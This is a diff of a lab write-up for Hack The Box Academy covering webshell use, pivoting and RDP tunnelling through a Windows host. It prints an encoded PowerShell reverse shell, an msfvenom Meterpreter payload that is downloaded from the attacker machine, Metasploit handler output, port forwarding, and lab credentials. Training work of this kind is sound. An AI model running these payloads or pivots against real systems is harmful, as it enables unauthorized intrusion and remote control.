@@ -39,9 +39,16 @@ Nmap done: 1 IP address (1 host up) scanned in 20.51 seconds
 ```
 I then navigated to the Antak webshell hosted on the IIS server by opening Firefox and navigating to **http://10.129.63.234/uploads/antak.aspx**. Logged in with the credentials provided.
 
-Before executing a reverse shell, I set up a Netcat listener on my Linux machine to catch the incoming connection:
+Before executing a reverse shell, I set up a Metasploit handler on my Linux machine to catch the incoming connection:
 ```c
-nc -lvnp 4444
+msfconsole
+[msf](Jobs:0 Agents:0) >> use multi/handler
+payload => generic/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 10.10.14.108
+LHOST => 10.10.14.108
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 4444
+LPORT => 4444
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
 ```
 
 From the Antak webshell, I executed the following PowerShell payload to establish a reverse shell:
@@ -49,12 +56,7 @@ From the Antak webshell, I executed the following PowerShell payload to establis
 
 PS> powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAwADgAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
 ```
-To improve interactivity, I upgraded the shell using:
-
-```c
-Start-Process powershell.exe -NoNewWindow -ArgumentList "-NoExit"
-```
-Once I had an upgraded shell, I navigated to the Administrator's Desktop directory:
+I navigated to the Administrator's Desktop directory:
 
 ```c
 
@@ -151,7 +153,7 @@ After a few moments, Hashcat successfully cracked the hash, revealing the passwo
 
 4- **Submit the contents of the flag.txt file on the Administrator desktop on MS01**
 
-I started by pingin the MS01 host 
+I started by pinging MS01 to obtain its IP address:
 
 ```c
 PS C:\windows\system32\inetsrv> ping MS01
@@ -165,19 +167,54 @@ Request timed out.
 Ping statistics for 172.16.6.50:
     Packets: Sent = 4, Received = 0, Lost = 4 (100% loss),
 ```
-
-I then executed:
+Despite the ping timing out, the response revealed that MS01's IP address is 172.16.6.50. Next, I created a Meterpreter reverse shell payload using msfvenom, setting my attack machine (10.10.14.108) as the listener:
 ```c
-PS C:\windows\system32\inetsrv> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=3389 connectaddress=172.16.6.50
-
-PS C:\windows\system32\inetsrv> netsh.exe interface portproxy show v4tov4
-
-Listen on ipv4:             Connect to ipv4:
-
-Address         Port        Address         Port
---------------- ----------  --------------- ----------
-0.0.0.0   8080        172.16.6.50     3389
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.108 LPORT=8080 -f exe -o pivot.exe
 ```
 
+To transfer the payload, I started a simple HTTP server on my attack machine:
+```c
+┌─[us-academy-2]─[10.10.14.108]─[htb-ac-1310789@htb-ufdncxkgrv]─[~]
+└──╼ [★]$ python -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
+10.129.202.242 - - [27/Mar/2025 08:41:54] "GET /pivot.exe HTTP/1.1" 200 -
 
+```
+Then, on WEB-WIN01, I downloaded the payload using: 
+```c
+PS C:\Users\Administrator\Desktop> Invoke-WebRequest -Uri "http://10.10.14.108:8000/pivot.exe" -OutFile "C:\Users\Administrator\Desktop\pivot.exe"
+```
+
+On my attack machine, I launched msfconsole and configured a listener for the payload:
+```c
+┌─[us-academy-2]─[10.10.14.108]─[htb-ac-1310789@htb-ufdncxkgrv]─[~]
+└──╼ [★]$ msfconsole -q
+[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 0.0.0.0
+lhost => 0.0.0.0
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 8080
+lport => 8080
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
+[*] Started reverse TCP handler on 0.0.0.0:8080 
+[*] Sending stage (203846 bytes) to 10.129.202.242
+[*] Meterpreter session 1 opened (10.10.14.108:8080 -> 10.129.202.242:49709) at 2025-03-27 08:43:30 -0500
+
+(Meterpreter 1)(C:\Users\Administrator\Desktop) >
+```
+
+With the Meterpreter session established, I forwarded port 3389 (RDP) from MS01 to my local machine:
+```c
+(Meterpreter 1)(C:\Users\Administrator\Desktop) > portfwd add -l 3300 -p 3389 -r 172.16.6.50
+[*] Forward TCP relay created: (local) :3300 -> (remote) 172.16.6.50:3389
+```
+This allowed me to connect to MS01 via Remote Desktop by tunneling through WEB-WIN01. On my attack machine, I used xfreerdp to establish an RDP session with MS01 using the forwarded port:
+```c
+xfreerdp /v:localhost:3300 /u:svc_sql /p:lucky7
+```
+I navigated to C:\Users\Administrator\Desktop and obtained the flag.
+
+5- **Find cleartext credentials for another domain user. Submit the username as your answer.**
